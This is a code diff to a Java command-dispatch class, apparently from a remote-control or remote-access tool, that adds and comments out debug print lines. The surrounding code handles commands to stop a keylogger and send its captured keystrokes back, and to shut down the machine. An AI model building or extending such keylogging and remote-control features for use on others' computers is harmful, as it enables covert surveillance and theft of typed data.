@@ -87,8 +87,12 @@ public class ActionThread extends Thread {
 			} 
 		
 			else if (request.equals("KEY_LOGGER_STOP")) {
+				System.out.println("stopped");
 				KeyLogger keyLogger = new KeyLogger(oos, "");
+				System.out.println("stopped2");
 				keyLogger.send_KeyLogger();
+				System.out.println("stopped3");
+
 			} else if(request.equals("SHUT_DOWN")) {
 				ShutDown shutDown = new ShutDown(oos);
 				shutDown.shutDown();
@@ -110,7 +114,7 @@ public class ActionThread extends Thread {
 				throw new Exception();
 			}
 
-			System.out.println("2");
+			//System.out.println("2");
 			
 			oos.close();
 			ois.close();
